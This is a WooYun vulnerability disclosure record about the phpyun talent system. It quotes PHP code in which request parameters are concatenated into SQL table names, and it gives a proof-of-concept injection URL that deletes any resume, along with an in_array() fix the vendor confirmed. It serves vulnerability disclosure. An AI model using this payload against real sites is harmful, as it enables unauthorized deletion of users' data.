{"id": 22845, "wybug_id": "wooyun-2015-0105024", "wybug_title": "phpyun人才系(2015-02-03)Sql注入2枚(可删除任意简历)", "wybug_corp": "php云人才系统", "wybug_author": "JJ Fly", "wybug_date": "2015-04-02 11:12", "wybug_open_date": "2015-07-01 11:20", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向公众公开  简要描述： phpyun人才系(2015-02-03)Sql注入2枚(可删除任意简历)无法绕过waf，也就获取不了敏感信息。 详细说明：  代码/wap/member/model/index.class.php\nfunction addresume_action()//复制的较长，可直接略过。\t{\t\tif($this->config['user_enforce_identitycert']==\"1\")\t\t{\t\t\t$row=$this->obj->DB_select_once(\"resume\",\"`idcard_pic`<>'' and `uid`='\".$this->uid.\"'\");\t\t\tif($row['idcard_status']!=\"1\")\t\t\t{\t\t\t\t$data['msg']='请先登录电脑客户端完成身份认证！';\t\t\t\t$data['url']='index.php';\t\t\t}\t\t}\t\tif($_GET['type']&&intval($_GET['id'])){\t\t\t$nid=$this->obj->DB_delete_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\t\t\tif($nid)\t\t\t{\t\t\t\t$url=$_GET['type'];\t\t\t\t$this->obj->DB_update_all(\"user_resume\",\"`$url`=`$url`-1\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t\t$resume_row=$this->obj->DB_select_once(\"user_resume\",\"`eid`='\".(int)$_GET['eid'].\"'\");\t\t\t\t$this->obj->complete($resume_row);\t\t\t\t$data['msg']='删除成功！';\t\t\t}else{\t\t\t\t$data['msg']='删除失败！';\t\t\t}\t\t\t$data['url']='index.php?c=addresume&eid='.(int)$_GET['eid'];\t\t}\t\tif($_POST['submit']){\t\t\t$_POST=$this->post_trim_iconv($_POST);\t\t\tif($_POST['eid']>0){\t\t\t\t$table=\"resume_\".$_POST['table'];\t\t\t\t$id=(int)$_POST['id'];\t\t\t\t$url=$_POST['table'];\t\t\t\tunset($_POST['submit']);\t\t\t\tunset($_POST['table']);\t\t\t\tunset($_POST['id']);\t\t\t\tif($_POST['syear'])\t\t\t\t{\t\t\t\t\t$_POST['sdate']=strtotime($_POST['syear'].\"-\".$_POST['smouth'].\"-\".$_POST['sday']);\t\t\t\t\t$_POST['edate']=strtotime($_POST['eyear'].\"-\".$_POST['emouth'].\"-\".$_POST['eday']);\t\t\t\t\tunset($_POST['syear']);\t\t\t\t\tunset($_POST['smouth']);\t\t\t\t\tunset($_POST['sday']);\t\t\t\t\tunset($_POST['eyear']);\t\t\t\t\tunset($_POST['emouth']);\t\t\t\t\tunset($_POST['eday']);\t\t\t\t}\t\t\t\tif($id)\t\t\t\t{\t\t\t\t\t$where['id']=$id;\t\t\t\t\t$where['uid']=$this->uid;\t\t\t\t\t$nid=$this->obj->update_once($table,$_POST,$where);\t\t\t\t}else{\t\t\t\t\t$_POST['uid']=$this->uid;\t\t\t\t\t$nid=$this->obj->insert_into($table,$_POST);\t\t\t\t\t$this->obj->DB_update_all(\"user_resume\",\"`$url`=`$url`+1\",\"`eid`='\".(int)$_POST['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t\t\t$resume_row=$this->obj->DB_select_once(\"user_resume\",\"`eid`='\".(int)$_POST['eid'].\"'\");\t\t\t\t\t$this->obj->complete($resume_row);\t\t\t\t}\t\t\t\t$nid?$data['msg']='保存成功！':$data['msg']='保存失败！';\t\t\t\t$data['url']=$nid?('index.php?c=addresume&eid='.(int)$_POST['eid']):'';\t\t\t\t$data['msg']=iconv('gbk','utf-8',$data['msg']);\t\t\t\techo json_encode($data);die;\t\t\t} else{\t\t\t\tif($_POST['name']==\"\"){\t\t\t\t\t$data['msg']='姓名不能为空！';\t\t\t\t}else if($_POST['sex']==\"\"){\t\t\t\t\t$data['msg']='性别不能为空！';\t\t\t\t}else if($this->config['user_idcard']==\"1\"&&trim($_POST['idcard'])==\"\"){\t\t\t\t\t$data['msg']='身份证号码不能为空！';\t\t\t\t}else if($_POST['living']==\"\"){\t\t\t\t\t$data['msg']='现居住地不能为空！';\t\t\t\t}else{\t\t\t\t\tunset($_POST['submit']);\t\t\t\t\t$this->obj->delfiledir(\"../upload/tel/\".$this->uid);\t\t\t\t\t$where['uid']=$this->uid;\t\t\t\t\t$nid=$this->obj->update_once(\"resume\",$_POST,$where);\t\t\t\t\tif($nid){\t\t\t\t\t\t$this->obj->update_once(\"member\",array('email'=>$_POST['email'],'moblie'=>$_POST['telphone']),$where);\t\t\t\t\t\t$this->obj->member_log(\"保存基本信息\");\t\t\t\t\t\t$data['msg']='保存成功！';\t\t\t\t\t\t$data['url']='index.php?c=addresume';\t\t\t\t\t}else{\t\t\t\t\t\t$data['msg']='保存失败！';\t\t\t\t\t\t$data['url']='index.php?c=addresume';\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\tif(!$_GET['eid']&&$_POST['submit']==''){\t\t\t$num=$this->obj->DB_select_once(\"member_statis\",\"`uid`='\".$this->uid.\"'\");\t\t\t$maxnum=$this->config['user_number']-$num['resume_num'];\t\t\t$confignum=$this->config['user_number'];\t\t\tif($maxnum<=0 &&$confignum!=\"\"){\t\t\t\t$data['msg']='你的简历数已经超过系统设置的简历数了！';\t\t\t\t$data['url']='index.php?c=resume';\t\t\t}\t\t}else if($_GET['eid']){\t\t\t$row=$this->obj->DB_select_once(\"resume_expect\",\"`id`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\tinclude(PLUS_PATH.\"job.cache.php\");\t\t\t$job_classid=@explode(\",\",$row['job_classid']);\t\t\tforeach($job_classid as $v){\t\t\t\t$jobname[]=$job_name[$v];\t\t\t}\t\t\t$jobname=@implode(\",\",$jobname);\t\t\t$this->yunset(\"row\",$row);\t\t\t$this->yunset(\"jobname\",$jobname);\t\t\t$skill=$this->obj->DB_select_all(\"resume_skill\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$work=$this->obj->DB_select_all(\"resume_work\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$project=$this->obj->DB_select_all(\"resume_project\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$edu=$this->obj->DB_select_all(\"resume_edu\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$training=$this->obj->DB_select_all(\"resume_training\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$cert=$this->obj->DB_select_all(\"resume_cert\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$other=$this->obj->DB_select_all(\"resume_other\",\"`eid`='\".(int)$_GET['eid'].\"' and `uid`='\".$this->uid.\"'\");\t\t\t$this->yunset(\"skill\",$skill);\t\t\t$this->yunset(\"work\",$work);\t\t\t$this->yunset(\"project\",$project);\t\t\t$this->yunset(\"edu\",$edu);\t\t\t$this->yunset(\"training\",$training);\t\t\t$this->yunset(\"cert\",$cert);\t\t\t$this->yunset(\"other\",$other);\t\t}\t\t$resume=$this->obj->DB_select_once(\"resume\",\"`uid`='\".$this->uid.\"'\");\t\t$this->yunset(\"resume\",$resume);\t\t$this->yunset(\"layer\",$data);\t\t$CacheArr['user'] =array('userdata','userclass_name');\t\t$CacheArr['job'] =array('job_index','job_type','job_name');\t\t$CacheArr['city'] =array('city_index','city_type','city_name');\t\t$CacheArr['industry'] =array('industry_index','industry_name');\t\t$CacheArr=$this->CacheInclude($CacheArr);\t\t$this->waptpl('addresume');\t}\n这里我们可以看到 。\n$nid=$this->obj->DB_delete_all(\"resume_\".$_GET['type'],\"`eid`='\".(int)$_GET['eid'].\"' and `id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");\n这里$_GET[‘type’]直接入库。我们可以进行注入。还有这个函数下面的内容\n$table=\"resume_\".$_POST['table'];//重点、。。。。。\t\t\t\t$id=(int)$_POST['id'];\t\t\t\t$url=$_POST['table'];\t\t\t\tunset($_POST['submit']);\t\t\t\tunset($_POST['table']);\t\t\t\tunset($_POST['id']);\t\t\t\tif($_POST['syear'])\t\t\t\t{\t\t\t\t\t$_POST['sdate']=strtotime($_POST['syear'].\"-\".$_POST['smouth'].\"-\".$_POST['sday']);\t\t\t\t\t$_POST['edate']=strtotime($_POST['eyear'].\"-\".$_POST['emouth'].\"-\".$_POST['eday']);\t\t\t\t\tunset($_POST['syear']);\t\t\t\t\tunset($_POST['smouth']);\t\t\t\t\tunset($_POST['sday']);\t\t\t\t\tunset($_POST['eyear']);\t\t\t\t\tunset($_POST['emouth']);\t\t\t\t\tunset($_POST['eday']);\t\t\t\t}\t\t\t\tif($id)\t\t\t\t{\t\t\t\t\t$where['id']=$id;\t\t\t\t\t$where['uid']=$this->uid;\t\t\t\t\t$nid=$this->obj->update_once($table,$_POST,$where);\n同理的还有下面这个函数\nfunction addresumeson_action()\t{\t\tif($_GET['id']){\t\t\t$row=$this->obj->DB_select_once(\"resume_\".$_GET['type'],\"`id`='\".(int)$_GET['id'].\"' and `uid`='\".$this->uid.\"'\");///重点。。。。。\t\t\t$this->yunset(\"row\",$row);\t\t}\t\t$this->user_cache();\t\t$this->waptpl('addresumeson');\t}\n   漏洞证明：  如何删除任意简历。简历在库中信息如下\n\n我们来构造一下type=expect` where id=3#Url\nhttp://localhost/phpyun/wap/member/index.php?c=addresume&id=1&type=expect%60%20where%20id%3D3%23\n\n\n\n\n   修复方案：  添加一个 in_array()   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-02 11:18 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}